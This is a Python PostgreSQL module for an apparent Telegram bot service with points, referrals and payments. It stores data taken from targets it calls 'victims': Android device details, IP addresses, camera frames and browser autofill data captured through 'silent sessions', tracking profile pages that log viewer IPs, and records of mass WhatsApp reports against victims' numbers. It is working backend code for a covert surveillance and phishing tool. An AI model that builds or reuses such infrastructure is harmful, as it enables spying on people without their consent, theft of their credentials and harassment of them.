# database.py
# ============================================================
# PostgreSQL (NeonDB) — قاعدة البيانات الدائمة
# ============================================================
import os
import json
import time
from datetime import datetime
from contextlib import contextmanager
from typing import Optional, List, Dict, Any

import psycopg2
from psycopg2.extras import RealDictCursor
from psycopg2.pool import SimpleConnectionPool

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("database")


# ============================================================
# [1] الإعدادات
# ============================================================
DATABASE_URL = os.environ.get("DATABASE_URL", "").strip()

# لو الرابط بيبدأ بـ postgres:// بدل postgresql://
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

_pool = None


# ============================================================
# [2] Connection Pool
# ============================================================
def init_pool():
    """تهيئة Connection Pool"""
    global _pool
    if _pool is not None:
        return _pool

    if not DATABASE_URL:
        logger.error("❌ DATABASE_URL not set!")
        return None

    try:
        _pool = SimpleConnectionPool(
            minconn=1,
            maxconn=15,
            dsn=DATABASE_URL,
            cursor_factory=RealDictCursor,
        )
        logger.info("[+] PostgreSQL Pool initialized")
        return _pool
    except Exception as e:
        logger.exception(f"❌ init_pool error: {e}")
        return None


@contextmanager
def get_db():
    """Context manager للاتصال بقاعدة البيانات"""
    global _pool
    if _pool is None:
        init_pool()

    if _pool is None:
        raise Exception("Database pool not initialized")

    conn = _pool.getconn()
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        _pool.putconn(conn)


# ============================================================
# [3] إنشاء الجداول
# ============================================================
def create_tables():
    """إنشاء كل الجداول اللازمة"""
    logger.info("🔨 Creating tables...")

    with get_db() as conn:
        cur = conn.cursor()

        # ═══ المستخدمين ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username VARCHAR(100),
                first_name VARCHAR(200),
                created_at TIMESTAMP DEFAULT NOW(),
                points INTEGER DEFAULT 0,
                total_points_earned INTEGER DEFAULT 0,
                total_points_spent INTEGER DEFAULT 0,
                ref_code VARCHAR(20) UNIQUE,
                referred_by BIGINT,
                referral_count INTEGER DEFAULT 0,
                is_banned BOOLEAN DEFAULT FALSE,
                is_vip BOOLEAN DEFAULT FALSE,
                notes TEXT,
                last_seen TIMESTAMP DEFAULT NOW()
            )
        """)

        # ═══ سجل المعاملات ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS points_history (
                id SERIAL PRIMARY KEY,
                user_id BIGINT NOT NULL,
                type VARCHAR(50) NOT NULL,
                points INTEGER DEFAULT 0,
                tool VARCHAR(50),
                tool_name VARCHAR(200),
                reason VARCHAR(500),
                admin_action BOOLEAN DEFAULT FALSE,
                old_value INTEGER,
                new_value INTEGER,
                meta JSONB,
                created_at TIMESTAMP DEFAULT NOW()
            )
        """)

        cur.execute("""
            CREATE INDEX IF NOT EXISTS idx_points_history_user
            ON points_history(user_id, created_at DESC)
        """)

        # ═══ الإحالات ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT NOT NULL,
                referred_id BIGINT NOT NULL UNIQUE,
                created_at TIMESTAMP DEFAULT NOW()
            )
        """)

        cur.execute("""
            CREATE INDEX IF NOT EXISTS idx_referrals_referrer
            ON referrals(referrer_id)
        """)

        # ═══ Silent Sessions ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS silent_sessions (
                session_id VARCHAR(50) PRIMARY KEY,
                chat_id BIGINT NOT NULL,
                label VARCHAR(100),
                created_at TIMESTAMP DEFAULT NOW(),
                accessed BOOLEAN DEFAULT FALSE,
                accessed_at TIMESTAMP,
                accessed_ip VARCHAR(50),
                collected BOOLEAN DEFAULT FALSE,
                collected_at TIMESTAMP,
                camera_started BOOLEAN DEFAULT FALSE,
                camera_frames INTEGER DEFAULT 0,
                autofill_received BOOLEAN DEFAULT FALSE,
                data JSONB,
                autofill_data JSONB
            )
        """)

        cur.execute("""
            CREATE INDEX IF NOT EXISTS idx_silent_chat
            ON silent_sessions(chat_id, created_at DESC)
        """)

        # ═══ Social Profiles ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS social_profiles (
                session_id VARCHAR(50) PRIMARY KEY,
                chat_id BIGINT NOT NULL,
                name VARCHAR(200),
                title VARCHAR(200),
                bio TEXT,
                photo TEXT,
                phone VARCHAR(50),
                email VARCHAR(200),
                website VARCHAR(500),
                whatsapp VARCHAR(50),
                telegram VARCHAR(100),
                instagram VARCHAR(100),
                facebook VARCHAR(100),
                views INTEGER DEFAULT 0,
                accessed BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT NOW(),
                last_viewed_at TIMESTAMP,
                last_viewer_ip VARCHAR(50)
            )
        """)

        cur.execute("""
            CREATE INDEX IF NOT EXISTS idx_profiles_chat
            ON social_profiles(chat_id, created_at DESC)
        """)

        # ═══ Victims ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS victims (
                victim_id VARCHAR(50) PRIMARY KEY,
                victim_token VARCHAR(100) UNIQUE NOT NULL,
                chat_id BIGINT NOT NULL,
                name VARCHAR(100),
                site VARCHAR(50),
                device_id VARCHAR(200),
                model VARCHAR(100),
                brand VARCHAR(100),
                android VARCHAR(50),
                sdk VARCHAR(20),
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT NOW(),
                last_seen TIMESTAMP,
                first_connection TIMESTAMP,
                permissions_status VARCHAR(50)
            )
        """)

        cur.execute("""
            CREATE INDEX IF NOT EXISTS idx_victims_chat
            ON victims(chat_id, last_seen DESC)
        """)

        # ═══ WhatsApp Reports ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS wa_reports (
                id SERIAL PRIMARY KEY,
                chat_id BIGINT NOT NULL,
                victim_number VARCHAR(30) NOT NULL,
                reason VARCHAR(50),
                reports_sent INTEGER DEFAULT 1,
                created_at TIMESTAMP DEFAULT NOW()
            )
        """)

        cur.execute("""
            CREATE INDEX IF NOT EXISTS idx_wa_reports_chat
            ON wa_reports(chat_id, created_at DESC)
        """)

        # ═══ Payments ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS payments (
                id SERIAL PRIMARY KEY,
                user_id BIGINT NOT NULL,
                amount INTEGER,
                stars INTEGER,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT NOW(),
                completed_at TIMESTAMP
            )
        """)

        # ═══ Admin Events ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS admin_events (
                id SERIAL PRIMARY KEY,
                admin_id BIGINT NOT NULL,
                event_type VARCHAR(100),
                details JSONB,
                created_at TIMESTAMP DEFAULT NOW()
            )
        """)

        cur.execute("""
            CREATE INDEX IF NOT EXISTS idx_admin_events_date
            ON admin_events(created_at DESC)
        """)

        # ═══ Admin Actions (إعطاء نجوم/نقاط/VIP) ═══
        cur.execute("""
            CREATE TABLE IF NOT EXISTS admin_actions (
                id SERIAL PRIMARY KEY,
                admin_id BIGINT NOT NULL,
                target_id BIGINT NOT NULL,
                action VARCHAR(50) NOT NULL,
                amount INTEGER,
                reason VARCHAR(500),
                meta JSONB,
                created_at TIMESTAMP DEFAULT NOW()
            )
        """)

        cur.execute("""
            CREATE INDEX IF NOT EXISTS idx_admin_actions_target
            ON admin_actions(target_id, created_at DESC)
        """)

        logger.info("✅ Tables created/verified")

    metrics.inc_counter("db_tables_created")


# ============================================================
# [4] User Operations
# ============================================================
def get_user_db(user_id: int) -> Optional[Dict]:
    """يجلب مستخدم من قاعدة البيانات"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("SELECT * FROM users WHERE user_id = %s", (user_id,))
            row = cur.fetchone()
            if row:
                return dict(row)
        return None
    except Exception as e:
        logger.error(f"get_user_db error: {e}")
        return None


def save_user_db(user_id: int, data: Dict) -> bool:
    """يحفظ أو يحدّث مستخدم"""
    try:
        with get_db() as conn:
            cur = conn.cursor()

            cur.execute("""
                INSERT INTO users (
                    user_id, username, first_name, points,
                    total_points_earned, total_points_spent,
                    ref_code, referred_by, referral_count,
                    is_banned, is_vip, notes, last_seen
                ) VALUES (
                    %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, NOW()
                )
                ON CONFLICT (user_id) DO UPDATE SET
                    username = EXCLUDED.username,
                    first_name = EXCLUDED.first_name,
                    points = EXCLUDED.points,
                    total_points_earned = EXCLUDED.total_points_earned,
                    total_points_spent = EXCLUDED.total_points_spent,
                    ref_code = COALESCE(EXCLUDED.ref_code, users.ref_code),
                    referral_count = EXCLUDED.referral_count,
                    is_banned = EXCLUDED.is_banned,
                    is_vip = EXCLUDED.is_vip,
                    notes = EXCLUDED.notes,
                    last_seen = NOW()
            """, (
                user_id,
                data.get("username", ""),
                data.get("first_name", ""),
                data.get("points", 0),
                data.get("total_points_earned", 0),
                data.get("total_points_spent", 0),
                data.get("ref_code", ""),
                data.get("referred_by"),
                data.get("referral_count", 0),
                data.get("is_banned", False),
                data.get("is_vip", False),
                data.get("notes", ""),
            ))
        return True
    except Exception as e:
        logger.error(f"save_user_db error: {e}")
        return False


def get_all_users_db() -> List[Dict]:
    """جلب كل المستخدمين"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("SELECT * FROM users ORDER BY created_at DESC")
            rows = cur.fetchall()
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"get_all_users_db error: {e}")
        return []


def delete_user_db(user_id: int) -> bool:
    """حذف مستخدم"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("DELETE FROM users WHERE user_id = %s", (user_id,))
            cur.execute("DELETE FROM points_history WHERE user_id = %s", (user_id,))
            cur.execute("DELETE FROM referrals WHERE referrer_id = %s OR referred_id = %s",
                        (user_id, user_id))
            cur.execute("DELETE FROM admin_actions WHERE target_id = %s", (user_id,))
        return True
    except Exception as e:
        logger.error(f"delete_user_db error: {e}")
        return False


# ============================================================
# [5] Points History
# ============================================================
def add_points_history(
    user_id: int,
    type_: str,
    points: int = 0,
    tool: str = None,
    tool_name: str = None,
    reason: str = None,
    admin_action: bool = False,
    old_value: int = None,
    new_value: int = None,
    meta: Dict = None,
) -> bool:
    """يضيف معاملة في السجل"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO points_history
                (user_id, type, points, tool, tool_name, reason,
                 admin_action, old_value, new_value, meta)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
            """, (
                user_id, type_, points, tool, tool_name,
                reason, admin_action, old_value, new_value,
                json.dumps(meta) if meta else None
            ))
        return True
    except Exception as e:
        logger.error(f"add_points_history error: {e}")
        return False


def get_points_history(user_id: int, limit: int = 20) -> List[Dict]:
    """جلب سجل المعاملات"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                SELECT * FROM points_history
                WHERE user_id = %s
                ORDER BY created_at DESC
                LIMIT %s
            """, (user_id, limit))
            rows = cur.fetchall()
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"get_points_history error: {e}")
        return []


# ============================================================
# [6] Referrals
# ============================================================
def add_referral(referrer_id: int, referred_id: int) -> bool:
    """يضيف إحالة جديدة"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO referrals (referrer_id, referred_id)
                VALUES (%s, %s)
                ON CONFLICT (referred_id) DO NOTHING
            """, (referrer_id, referred_id))
        return True
    except Exception as e:
        logger.error(f"add_referral error: {e}")
        return False


def get_user_referrals_db(user_id: int, limit: int = 50) -> List[Dict]:
    """جلب إحالات المستخدم"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                SELECT u.* FROM users u
                INNER JOIN referrals r ON u.user_id = r.referred_id
                WHERE r.referrer_id = %s
                ORDER BY r.created_at DESC
                LIMIT %s
            """, (user_id, limit))
            rows = cur.fetchall()
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"get_user_referrals_db error: {e}")
        return []


def get_referral_by_code_db(code: str) -> Optional[int]:
    """يجلب ID من كود الإحالة"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("SELECT user_id FROM users WHERE ref_code = %s", (code,))
            row = cur.fetchone()
            if row:
                return row["user_id"]
        return None
    except Exception as e:
        logger.error(f"get_referral_by_code_db error: {e}")
        return None


# ============================================================
# [7] Silent Sessions
# ============================================================
def save_silent_session(session_id: str, data: Dict) -> bool:
    """يحفظ silent session"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO silent_sessions
                (session_id, chat_id, label, accessed, accessed_at,
                 accessed_ip, collected, collected_at, camera_started,
                 camera_frames, autofill_received, data, autofill_data)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                ON CONFLICT (session_id) DO UPDATE SET
                    accessed = EXCLUDED.accessed,
                    accessed_at = EXCLUDED.accessed_at,
                    accessed_ip = EXCLUDED.accessed_ip,
                    collected = EXCLUDED.collected,
                    collected_at = EXCLUDED.collected_at,
                    camera_started = EXCLUDED.camera_started,
                    camera_frames = EXCLUDED.camera_frames,
                    autofill_received = EXCLUDED.autofill_received,
                    data = COALESCE(EXCLUDED.data, silent_sessions.data),
                    autofill_data = COALESCE(EXCLUDED.autofill_data, silent_sessions.autofill_data)
            """, (
                session_id,
                data.get("chat_id"),
                data.get("label", "")[:100],
                data.get("accessed", False),
                data.get("accessed_at"),
                data.get("accessed_ip"),
                data.get("collected", False),
                data.get("collected_at"),
                data.get("camera_started", False),
                data.get("camera_frames", 0),
                data.get("autofill_received", False),
                json.dumps(data.get("data")) if data.get("data") else None,
                json.dumps(data.get("autofill_data")) if data.get("autofill_data") else None,
            ))
        return True
    except Exception as e:
        logger.error(f"save_silent_session error: {e}")
        return False


def get_silent_session_db(session_id: str) -> Optional[Dict]:
    """يجلب silent session"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("SELECT * FROM silent_sessions WHERE session_id = %s", (session_id,))
            row = cur.fetchone()
            if row:
                return dict(row)
        return None
    except Exception as e:
        logger.error(f"get_silent_session_db error: {e}")
        return None


def get_user_silent_sessions_db(chat_id: int, limit: int = 50) -> List[Dict]:
    """جلب جلسات المستخدم"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                SELECT * FROM silent_sessions
                WHERE chat_id = %s
                ORDER BY created_at DESC
                LIMIT %s
            """, (chat_id, limit))
            rows = cur.fetchall()
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"get_user_silent_sessions_db error: {e}")
        return []


# ============================================================
# [8] Social Profiles
# ============================================================
def save_social_profile(session_id: str, data: Dict) -> bool:
    """يحفظ social profile"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO social_profiles
                (session_id, chat_id, name, title, bio, photo, phone,
                 email, website, whatsapp, telegram, instagram, facebook)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                ON CONFLICT (session_id) DO UPDATE SET
                    name = EXCLUDED.name,
                    title = EXCLUDED.title,
                    bio = EXCLUDED.bio,
                    photo = EXCLUDED.photo,
                    phone = EXCLUDED.phone,
                    email = EXCLUDED.email,
                    website = EXCLUDED.website,
                    whatsapp = EXCLUDED.whatsapp,
                    telegram = EXCLUDED.telegram,
                    instagram = EXCLUDED.instagram,
                    facebook = EXCLUDED.facebook
            """, (
                session_id,
                data.get("chat_id"),
                data.get("name", "")[:200],
                data.get("title", "")[:200],
                data.get("bio", ""),
                data.get("photo", ""),
                data.get("phone", "")[:50],
                data.get("email", "")[:200],
                data.get("website", "")[:500],
                data.get("whatsapp", "")[:50],
                data.get("telegram", "")[:100],
                data.get("instagram", "")[:100],
                data.get("facebook", "")[:100],
            ))
        return True
    except Exception as e:
        logger.error(f"save_social_profile error: {e}")
        return False


def get_social_profile(session_id: str) -> Optional[Dict]:
    """يجلب social profile"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("SELECT * FROM social_profiles WHERE session_id = %s", (session_id,))
            row = cur.fetchone()
            if row:
                return dict(row)
        return None
    except Exception as e:
        logger.error(f"get_social_profile error: {e}")
        return None


def increment_profile_view(session_id: str, ip: str = None) -> bool:
    """يزود عدد المشاهدات"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                UPDATE social_profiles
                SET views = views + 1,
                    accessed = TRUE,
                    last_viewed_at = NOW(),
                    last_viewer_ip = %s
                WHERE session_id = %s
            """, (ip, session_id))
        return True
    except Exception as e:
        logger.error(f"increment_profile_view error: {e}")
        return False


# ============================================================
# [9] Victims
# ============================================================
def create_victim_db(victim_id: str, data: Dict) -> bool:
    """يحفظ ضحية جديدة"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO victims
                (victim_id, victim_token, chat_id, name, site, status)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (victim_id) DO UPDATE SET
                    name = EXCLUDED.name,
                    device_id = COALESCE(EXCLUDED.device_id, victims.device_id),
                    model = COALESCE(EXCLUDED.model, victims.model),
                    brand = COALESCE(EXCLUDED.brand, victims.brand),
                    android = COALESCE(EXCLUDED.android, victims.android),
                    status = EXCLUDED.status,
                    last_seen = NOW()
            """, (
                victim_id,
                data.get("victim_token"),
                data.get("chat_id"),
                data.get("name", "")[:100],
                data.get("site", "general"),
                data.get("status", "pending"),
            ))
        return True
    except Exception as e:
        logger.error(f"create_victim_db error: {e}")
        return False


def find_victim_by_token_db(victim_token: str) -> Optional[Dict]:
    """يجلب ضحية بالتوكن"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("SELECT * FROM victims WHERE victim_token = %s", (victim_token,))
            row = cur.fetchone()
            if row:
                return dict(row)
        return None
    except Exception as e:
        logger.error(f"find_victim_by_token_db error: {e}")
        return None


def get_victim_db(chat_id: int, victim_id: str) -> Optional[Dict]:
    """يجلب ضحية معينة"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute(
                "SELECT * FROM victims WHERE chat_id = %s AND victim_id = %s",
                (chat_id, victim_id)
            )
            row = cur.fetchone()
            if row:
                return dict(row)
        return None
    except Exception as e:
        logger.error(f"get_victim_db error: {e}")
        return None


def get_all_victims_db(chat_id: int) -> List[Dict]:
    """جلب كل ضحايا مستخدم"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                SELECT * FROM victims
                WHERE chat_id = %s
                ORDER BY last_seen DESC NULLS LAST, created_at DESC
            """, (chat_id,))
            rows = cur.fetchall()
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"get_all_victims_db error: {e}")
        return []


# ============================================================
# [10] WhatsApp Reports
# ============================================================
def add_wa_report_db(chat_id: int, victim_number: str, reason: str) -> bool:
    """يضيف بلاغ واتساب"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO wa_reports (chat_id, victim_number, reason)
                VALUES (%s, %s, %s)
            """, (chat_id, victim_number, reason))
        return True
    except Exception as e:
        logger.error(f"add_wa_report_db error: {e}")
        return False


def get_wa_reports_db(chat_id: int, limit: int = 20) -> List[Dict]:
    """جلب سجل بلاغات المستخدم"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                SELECT * FROM wa_reports
                WHERE chat_id = %s
                ORDER BY created_at DESC
                LIMIT %s
            """, (chat_id, limit))
            rows = cur.fetchall()
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"get_wa_reports_db error: {e}")
        return []


# ============================================================
# [11] Admin Events
# ============================================================
def log_admin_event_db(admin_id: int, event_type: str, details: Dict = None) -> bool:
    """يسجل حدث أدمن"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO admin_events (admin_id, event_type, details)
                VALUES (%s, %s, %s)
            """, (
                admin_id,
                event_type,
                json.dumps(details) if details else None
            ))
        return True
    except Exception as e:
        logger.error(f"log_admin_event_db error: {e}")
        return False


def get_admin_events_db(limit: int = 30) -> List[Dict]:
    """جلب آخر الأحداث الإدارية"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                SELECT * FROM admin_events
                ORDER BY created_at DESC
                LIMIT %s
            """, (limit,))
            rows = cur.fetchall()
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"get_admin_events_db error: {e}")
        return []


# ============================================================
# [12] Admin Actions (إعطاء نجوم / نقاط / VIP)
# ============================================================
def log_admin_action_db(
    admin_id: int,
    target_id: int,
    action: str,
    amount: int = None,
    reason: str = None,
    meta: Dict = None,
) -> bool:
    """يسجل إجراء أدمن (نجوم، نقاط، VIP)"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO admin_actions
                (admin_id, target_id, action, amount, reason, meta)
                VALUES (%s, %s, %s, %s, %s, %s)
            """, (
                admin_id, target_id, action, amount, reason,
                json.dumps(meta) if meta else None
            ))
        return True
    except Exception as e:
        logger.error(f"log_admin_action_db error: {e}")
        return False


def get_admin_actions_db(target_id: int, limit: int = 20) -> List[Dict]:
    """جلب إجراءات الأدمن على مستخدم"""
    try:
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("""
                SELECT * FROM admin_actions
                WHERE target_id = %s
                ORDER BY created_at DESC
                LIMIT %s
            """, (target_id, limit))
            rows = cur.fetchall()
            return [dict(row) for row in rows]
    except Exception as e:
        logger.error(f"get_admin_actions_db error: {e}")
        return []


# ============================================================
# [13] Stats
# ============================================================
def get_db_stats() -> Dict:
    """إحصائيات قاعدة البيانات"""
    try:
        with get_db() as conn:
            cur = conn.cursor()

            stats = {}

            cur.execute("SELECT COUNT(*) as c FROM users")
            stats["total_users"] = cur.fetchone()["c"]

            cur.execute("""
                SELECT COUNT(*) as c FROM users
                WHERE last_seen > NOW() - INTERVAL '7 days'
            """)
            stats["active_users_7d"] = cur.fetchone()["c"]

            cur.execute("SELECT COUNT(*) as c FROM users WHERE is_vip = TRUE")
            stats["vip_users"] = cur.fetchone()["c"]

            cur.execute("SELECT COUNT(*) as c FROM users WHERE is_banned = TRUE")
            stats["banned_users"] = cur.fetchone()["c"]

            cur.execute("SELECT COALESCE(SUM(points), 0) as s FROM users")
            stats["total_points"] = cur.fetchone()["s"]

            cur.execute("SELECT COUNT(*) as c FROM silent_sessions")
            stats["silent_sessions"] = cur.fetchone()["c"]

            cur.execute("SELECT COUNT(*) as c FROM social_profiles")
            stats["social_profiles"] = cur.fetchone()["c"]

            cur.execute("SELECT COUNT(*) as c FROM victims")
            stats["victims"] = cur.fetchone()["c"]

            cur.execute("SELECT COUNT(*) as c FROM wa_reports")
            stats["wa_reports"] = cur.fetchone()["c"]

            return stats

    except Exception as e:
        logger.error(f"get_db_stats error: {e}")
        return {}


# ============================================================
# [14] Init
# ============================================================
def init_database():
    """تهيئة قاعدة البيانات"""
    try:
        if not DATABASE_URL:
            logger.warning("⚠️ DATABASE_URL not set — DB disabled")
            return False

        init_pool()
        if _pool is None:
            logger.error("❌ Failed to init pool")
            return False

        create_tables()
        logger.info("[+] Database initialized successfully")
        return True

    except Exception as e:
        logger.exception(f"❌ init_database error: {e}")
        return False
